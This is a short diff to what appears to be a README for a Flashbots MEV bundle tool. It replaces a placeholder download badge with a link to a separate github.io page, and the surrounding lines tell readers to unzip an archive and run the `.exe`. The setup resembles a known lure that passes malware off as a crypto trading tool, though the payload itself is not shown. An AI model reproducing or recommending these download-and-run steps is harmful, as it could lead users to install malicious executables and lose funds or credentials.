@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` (or appropriate binary for your OS) — the tool will be ready for sending MEV bundles via Flashbots Relay.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://flashbots-mev-bundle-runner.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
